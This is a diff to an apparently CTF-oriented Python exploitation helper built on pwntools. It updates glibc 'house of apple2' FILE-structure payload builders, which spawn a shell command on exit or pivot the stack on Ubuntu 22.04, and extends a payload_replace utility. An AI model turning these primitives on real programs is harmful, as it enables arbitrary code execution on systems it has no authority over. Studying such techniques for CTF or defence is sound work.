@@ -215,7 +215,8 @@ class IO_FILE_plus_struct(FileStructure):
         })
         return payload
 
-    # house of apple2: https://www.roderickchan.cn/post/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/
+    # house of apple2: https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/
+    # suitable for ubuntu 22.04
     def house_of_apple2_execmd_when_exit(self, standard_FILE_addr: int, _IO_wfile_jumps_addr: int, system_addr: int, cmd: str="sh"):
         """make sure standard_FILE_addr is one of address of _IO_2_1_stdin_/_IO_2_1_stdout_/_IO_2_1_stderr_. If not, content of standard_FILE_addr-0x30 and standard_FILE_addr-0x18 must be 0."""
         assert context.bits == 64, "only support amd64!"
@@ -233,7 +234,8 @@ class IO_FILE_plus_struct(FileStructure):
     
     house_of_apple2_execmd_when_do_IO_operation = house_of_apple2_execmd_when_exit
 
-    # house of apple2: https://www.roderickchan.cn/post/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/
+    # house of apple2: https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/
+    # suitable for ubuntu 22.04
     def house_of_apple2_stack_pivoting_when_exit(self, standard_FILE_addr: int, _IO_wfile_jumps_addr: int, leave_ret_addr: int, pop_rbp_addr: int, fake_rbp_addr: int):
         """make sure standard_FILE_addr is one of address of _IO_2_1_stdin_/_IO_2_1_stdout_/_IO_2_1_stderr_. If not, content of standard_FILE_addr-0x30 and standard_FILE_addr-0x18 must be 0."""
         assert context.bits == 64, "only support amd64!"
@@ -377,18 +379,30 @@ class IO_FILE_plus_struct(FileStructure):
 
 
 def payload_replace(payload: str or bytes, rpdict:dict=None, filler="\x00"):
-    assert isinstance(payload, (str, bytes, int)), "wrong payload!"
+    assert isinstance(payload, (str, bytes)), "wrong payload!"
     assert context.bits in (32, 64), "wrong context.bits!"
     assert len(filler) == 1, "wrong filler!"
     
-    output = list(payload) if isinstance(payload, bytes) else list(payload.encode('latin-1'))
+    if isinstance(payload, str):
+        payload = payload.encode('latin-1')
+
+    output = list(payload)
     
     if isinstance(filler, str):
         filler = filler.encode('latin-1')
 
     for off, data in rpdict.items():
-        assert isinstance(off, int), "wrong off in rpdict!"
+        assert isinstance(off, (int, str, bytes)), "wrong off in rpdict! Type error!"
         assert isinstance(data, (int, bytes, str)), "wrong data: {}!".format(data)
+        
+        if isinstance(off, str):
+            off = off.encode('latin-1')
+        
+        if isinstance(off, bytes):
+            off = payload.find(off)
+            assert off > -1, "Cannot find off in payload!"   
+        else:
+            assert off > -1, "wrong off in rpdict! Cannot be neg number!"
 
         if isinstance(data, str):
             data = data.encode('latin-1')
@@ -400,4 +414,5 @@ def payload_replace(payload: str or bytes, rpdict:dict=None, filler="\x00"):
 
         for i, d in enumerate(data):
             output[off+i] = d
+        
     return bytes(output)
